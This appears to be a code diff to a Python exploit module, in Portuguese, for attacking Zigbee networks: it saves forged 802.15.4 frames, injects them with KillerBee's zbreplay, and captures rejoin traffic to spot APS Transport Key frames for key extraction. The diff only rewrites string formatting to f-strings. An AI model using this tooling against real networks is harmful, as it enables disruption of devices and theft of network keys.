@@ -130,7 +130,7 @@ class Exploit(Exploit):
             os.makedirs(out_dir, exist_ok=True)
             return out_dir
         except OSError as exc:
-            print_error("Falha ao criar diretorio de saida: {}".format(exc))
+            print_error(f"Falha ao criar diretorio de saida: {exc}")
             return None
 
     def _validate_channel(self, ch: int) -> bool:
@@ -142,9 +142,9 @@ class Exploit(Exploit):
     def _exec(self, cmd: List[str], label: str = "") -> Optional[int]:
         cmd_str = " ".join(cmd)
         if bool(self.dry_run):
-            print_info("[dry-run] {}: {}".format(label, cmd_str))
+            print_info(f"[dry-run] {label}: {cmd_str}")
             return 0
-        print_status("{}: {}".format(label, cmd_str))
+        print_status(f"{label}: {cmd_str}")
         try:
             result = subprocess.run(
                 cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=120,
@@ -154,13 +154,13 @@ class Exploit(Exploit):
                 print_info(line)
             return result.returncode
         except subprocess.TimeoutExpired:
-            print_error("{} excedeu o timeout.".format(label))
+            print_error(f"{label} excedeu o timeout.")
             return None
         except FileNotFoundError:
-            print_error("Binario nao encontrado: {}".format(cmd[0]))
+            print_error(f"Binario nao encontrado: {cmd[0]}")
             return None
         except Exception as exc:
-            print_error("Erro ao executar {}: {}".format(label, exc))
+            print_error(f"Erro ao executar {label}: {exc}")
             return None
 
     def _info_mode(self) -> None:
@@ -188,7 +188,7 @@ class Exploit(Exploit):
         print_info("")
         print_info("Dependencias:")
         has_scapy = "SIM" if HAS_SCAPY else "NAO"
-        print_info("  Scapy (802.15.4): {}".format(has_scapy))
+        print_info(f"  Scapy (802.15.4): {has_scapy}")
         zbid = _which_kb("zbid")
         print_info("  KillerBee (zbid): {}".format(zbid if zbid else "NAO encontrado"))
         zbreplay = _which_kb("zbreplay")
@@ -200,7 +200,7 @@ class Exploit(Exploit):
             print_error("Defina interface (dispositivo KillerBee, ex.: /dev/ttyUSB0).")
             return False
         if not os.path.exists(iface) and not bool(self.dry_run):
-            print_error("Dispositivo nao encontrado: {}".format(iface))
+            print_error(f"Dispositivo nao encontrado: {iface}")
             return False
         return True
 
@@ -230,7 +230,7 @@ class Exploit(Exploit):
 
         for label, val in [("pan_id", pan), ("target_short_addr", target), ("new_pan_id", new_pan)]:
             if not _validate_short_addr(val):
-                print_error("{} invalido: {}".format(label, val))
+                print_error(f"{label} invalido: {val}")
                 return None
 
         if not self._validate_channel(new_ch):
@@ -275,7 +275,7 @@ class Exploit(Exploit):
         """
         pan = str(self.pan_id).strip()
         if not _validate_short_addr(pan):
-            print_error("pan_id invalido: {}".format(pan))
+            print_error(f"pan_id invalido: {pan}")
             return None
 
         pan_int = _parse_short_addr(pan)
@@ -323,13 +323,10 @@ class Exploit(Exploit):
             with open(frame_file, "wb") as fh:
                 fh.write(frame)
 
-        print_info("Frame salvo em: {}".format(frame_file))
-        print_info("Tamanho: {} bytes".format(len(frame)))
+        print_info(f"Frame salvo em: {frame_file}")
+        print_info(f"Tamanho: {len(frame)} bytes")
         print_info(
-            "Alvo: PAN={}, addr={}, novo PAN={}, novo canal={}".format(
-                self.pan_id, self.target_short_addr,
-                self.new_pan_id, int(self.new_channel),
-            )
+            f"Alvo: PAN={self.pan_id}, addr={self.target_short_addr}, novo PAN={self.new_pan_id}, novo canal={int(self.new_channel)}"
         )
 
         zbreplay = _which_kb("zbreplay")
@@ -337,7 +334,7 @@ class Exploit(Exploit):
             print_error(
                 "zbreplay nao encontrado. Instale KillerBee: pip install killerbee"
             )
-            print_info("Frame salvo em {}. Injete manualmente com hardware compativel.".format(frame_file))
+            print_info(f"Frame salvo em {frame_file}. Injete manualmente com hardware compativel.")
             return
 
         iface = str(self.interface).strip()
@@ -383,15 +380,15 @@ class Exploit(Exploit):
             with open(frame_file, "wb") as fh:
                 fh.write(frame)
 
-        print_info("Frame salvo em: {}".format(frame_file))
-        print_info("PAN alvo: {}".format(self.pan_id))
+        print_info(f"Frame salvo em: {frame_file}")
+        print_info(f"PAN alvo: {self.pan_id}")
 
         zbreplay = _which_kb("zbreplay")
         if not zbreplay:
             print_error(
                 "zbreplay nao encontrado. Instale KillerBee: pip install killerbee"
             )
-            print_info("Frame salvo em {}. Injete manualmente.".format(frame_file))
+            print_info(f"Frame salvo em {frame_file}. Injete manualmente.")
             return
 
         iface = str(self.interface).strip()
@@ -437,12 +434,12 @@ class Exploit(Exploit):
 
         cmd_str = " ".join(cmd)
         if bool(self.dry_run):
-            print_info("[dry-run] Rejoin Monitor: {}".format(cmd_str))
+            print_info(f"[dry-run] Rejoin Monitor: {cmd_str}")
             print_info("[dry-run] Apos captura, analise com zigbee_key_extract (mode=extract).")
             return
 
-        print_status("Iniciando captura para monitorar rejoin no canal {}...".format(ch))
-        print_info("Comando: {}".format(cmd_str))
+        print_status(f"Iniciando captura para monitorar rejoin no canal {ch}...")
+        print_info(f"Comando: {cmd_str}")
         print_info("Pressione Ctrl+C para parar a captura.")
         print_info("")
 
@@ -452,18 +449,18 @@ class Exploit(Exploit):
             print_info("\nCaptura interrompida.")
 
         if os.path.isfile(capture_file):
-            print_success("Captura salva em: {}".format(capture_file))
+            print_success(f"Captura salva em: {capture_file}")
             print_info("")
             print_info("Para extrair chaves da captura:")
             print_info("  Use o modulo zigbee_key_extract com:")
             print_info("    mode=extract")
-            print_info("    pcap_file={}".format(capture_file))
+            print_info(f"    pcap_file={capture_file}")
 
             if HAS_SCAPY:
                 print_status("Analise rapida da captura...")
                 try:
                     packets = rdpcap(capture_file)
-                    print_info("Pacotes capturados: {}".format(len(packets)))
+                    print_info(f"Pacotes capturados: {len(packets)}")
 
                     transport_key_count = 0
                     for pkt in packets:
@@ -473,15 +470,13 @@ class Exploit(Exploit):
 
                     if transport_key_count > 0:
                         print_success(
-                            "{} possiveis APS Transport Key frames detectados!".format(
-                                transport_key_count,
-                            )
+                            f"{transport_key_count} possiveis APS Transport Key frames detectados!"
                         )
                         print_info("Execute zigbee_key_extract (mode=extract) para analise completa.")
                     else:
                         print_info("Nenhum APS Transport Key detectado na captura.")
                 except Exception as exc:
-                    print_error("Falha na analise rapida: {}".format(exc))
+                    print_error(f"Falha na analise rapida: {exc}")
         else:
             print_info("Nenhum arquivo de captura gerado.")
 
